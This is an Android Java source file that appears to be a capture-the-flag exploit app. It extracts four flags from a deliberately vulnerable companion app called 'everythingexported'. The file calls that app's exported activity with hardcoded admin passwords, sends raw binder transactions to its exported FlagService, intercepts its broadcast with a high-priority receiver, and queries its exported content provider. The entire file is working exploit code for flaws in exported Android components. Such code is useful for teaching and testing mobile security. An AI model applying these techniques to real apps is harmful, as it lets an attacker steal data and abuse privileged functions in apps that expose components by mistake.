package cn.ac.iie.rd6.expforeverythingexported;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.RemoteException;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    private TextView tv_output;
    private IBinder mIBinder;
    private boolean isConnected;
    private MainActivity mInstance;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tv_output = (TextView) findViewById(R.id.tv_output);
        Intent intent = new Intent();
        intent.setClassName("cn.ac.iie.rd6.everythingexported","cn.ac.iie.rd6.everythingexported.FlagService");
        bindService(intent, conn, BIND_AUTO_CREATE);

        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("everything.exported.broadcast");
        intentFilter.setPriority(99999);
        registerReceiver(flag3Reciever, intentFilter);

        getFlag1();
        getFlag4();
    }

    protected void onDestroy() {
        super.onDestroy();
        unbindService(conn);
    }

    private void getFlag1() {
        Intent intent = new Intent();
        intent.setAction("export.everything.queryflag1");
        intent.setClassName("cn.ac.iie.rd6.everythingexported","cn.ac.iie.rd6.everythingexported.FlagActivity");
        intent.putExtra("username", "admin");
        intent.putExtra("password", "activity");
        startActivityForResult(intent, 0);
    }

    private void getFlag2() {
        android.os.Parcel _data = android.os.Parcel.obtain();
        android.os.Parcel _reply = android.os.Parcel.obtain();
        _data.writeInterfaceToken("FlagService");
        _data.writeString("admin") ; // username
        _data.writeString("service") ; // password
        try{
            mIBinder.transact(0x001, _data, _reply, 0);
            String flag2 = "flag2:" + _reply.readString() + "\n";
            tv_output.append(flag2);
        }catch( RemoteException re){
            re.printStackTrace();
        }catch( NullPointerException ne){
            ne.printStackTrace();
        }finally {
            _reply.recycle();
            _data.recycle();
        }
    }

    private void getFlag3() {

        android.os.Parcel _data = android.os.Parcel.obtain();
        android.os.Parcel _reply = android.os.Parcel.obtain();
        _data.writeInterfaceToken("FlagService");
        _data.writeString("admin") ; // username
        _data.writeString("receiver") ; // password
        try{
            mIBinder.transact(0x002, _data, _reply, 0);
        }catch( RemoteException re){
            re.printStackTrace();
        }catch( NullPointerException ne){
            ne.printStackTrace();
        }finally {
            _reply.recycle();
            _data.recycle();
        }
    }

    public BroadcastReceiver flag3Reciever = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if ( "everything.exported.broadcast".equals(intent.getAction())) {
                String flag3 = "flag3:" + intent.getStringExtra("flag3") + "\n";
                tv_output.append(flag3);
            }
        }
    };

    private void getFlag4() {
        Uri uri = Uri.parse("content://everything.exported.provider/download/1");
        Cursor flagCursor = getContentResolver().query(uri, new String[]{"filename"}, null, null, null);
        flagCursor.moveToFirst();
        String flag4 = "flag4:" + flagCursor.getString(0)+ "\n" ;
        tv_output.append(flag4);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
        if (requestCode == 0 && resultCode == 0) {
            String flag1 = "flag1:" + intent.getStringExtra("flag1") + "\n" ;
            tv_output.append(flag1);
        }
    }

    private ServiceConnection conn = new ServiceConnection() {
        public void onServiceConnected(ComponentName name, IBinder service) {
            mIBinder = service ;
            getFlag2();
            getFlag3();
        }
        public void onServiceDisconnected(ComponentName name) {
            mIBinder = null;
        }

    };
}
